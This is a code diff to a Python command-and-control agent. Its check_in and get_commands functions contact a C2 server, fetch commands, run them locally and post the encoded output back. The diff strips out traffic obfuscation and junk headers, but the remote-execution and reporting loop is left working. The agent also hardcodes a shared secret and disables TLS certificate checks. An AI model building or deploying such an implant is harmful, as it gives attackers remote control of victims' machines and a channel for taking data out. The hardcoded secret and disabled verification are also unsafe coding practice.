@@ -10,10 +10,7 @@ import os
 import platform
 import secrets
 import random
-import string
 from core.crypto import hash_challenge
-from core.obfuscation import add_junk_headers, obfuscate_data, deobfuscate_data
-
 # from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 from config.settings import (
@@ -127,31 +124,23 @@ def check_in():
             'nonce': client_nonce
         }
         
-        headers = add_junk_headers()
-        obfuscated_data = {'d': obfuscate_data(data)}
-        
         resp = session.post(
             f"{C2_SERVER}/overview", 
-            json=obfuscated_data,
-            headers=headers,
-            verify=False,
+            json=data, 
+            verify=False,  # In production, set to True with valid certs
             timeout=10
         )
         
         if resp.status_code == 200:
             server_data = resp.json()
-            
-            # Deobfuscate the response if needed
-            if 'd' in server_data:
-                server_data = deobfuscate_data(server_data.get('d'))
-            
             server_nonce = server_data.get('challenge')
             
             if not server_nonce:
                 logging.error("Server didn't provide a challenge")
                 return False
                 
-            shared_secret = "uacneQWE1AKfjf"
+            ############# replace with secure KMS in future ###################
+            shared_secret = "uacneQWE1AKfjf"  
             
             challenge_response = hash_challenge(
                 challenge=server_nonce,
@@ -164,13 +153,9 @@ def check_in():
                 'response': challenge_response
             }
             
-            headers = add_junk_headers()
-            obfuscated_verify_data = {'d': obfuscate_data(verify_data)}
-            
             verify_resp = session.post(
                 f"{C2_SERVER}/verify", 
-                json=obfuscated_verify_data,
-                headers=headers,
+                json=verify_data, 
                 verify=False,
                 timeout=10
             )
@@ -194,27 +179,15 @@ def get_commands():
     Retrieves commands from the C2 server and executes them
     """
     try:
-        # Generate and add junk headers
-        headers = add_junk_headers()
-        
-        # Request commands with junk data
-        junk_data = {'timestamp': time.time(), 'id': generate_random_string(8)}
-        obfuscated_data = {'d': obfuscate_data(junk_data)}
-        
+        # Request commands
         resp = session.post(
             f"{C2_SERVER}/cmd", 
-            json=obfuscated_data,
-            headers=headers,
             verify=False,
             timeout=10
         )
         
         if resp.status_code == 200:
             data = resp.json()
-            
-            # Deobfuscate response if needed
-            if 'd' in data:
-                data = deobfuscate_data(data.get('d'))
             
             if data.get('status') == 'active':
                 cmd = data.get('cmd')
@@ -224,21 +197,15 @@ def get_commands():
                     
                     result = execute_command(cmd)
                     
-                    # Use obfuscation for results
                     result_payload = {
                         'output': base64.b64encode(str(result.get('output', '')).encode('utf-8')).decode('utf-8'),
                         'error': base64.b64encode(str(result.get('error', '')).encode('utf-8')).decode('utf-8'),
                         'code': result.get('code')
                     }
                     
-                    # Obfuscate the result
-                    headers = add_junk_headers()
-                    obfuscated_result = {'d': obfuscate_data(result_payload)}
-                    
                     report_resp = session.post(
                         f"{C2_SERVER}/report", 
-                        json=obfuscated_result,
-                        headers=headers,
+                        json=result_payload, 
                         verify=False,
                         timeout=10
                     )
@@ -251,14 +218,9 @@ def get_commands():
                     logging.info("No command received")
         else:
             logging.warning(f"Failed to get commands: {resp.status_code}")
-
+            
     except Exception as e:
         logging.error(f"Command retrieval error: {str(e)}")
-
-def generate_random_string(length=10):
-    """Generate a random string of fixed length"""
-    letters = string.ascii_letters + string.digits
-    return ''.join(random.choice(letters) for _ in range(length))
 
 def run_agent():
     """
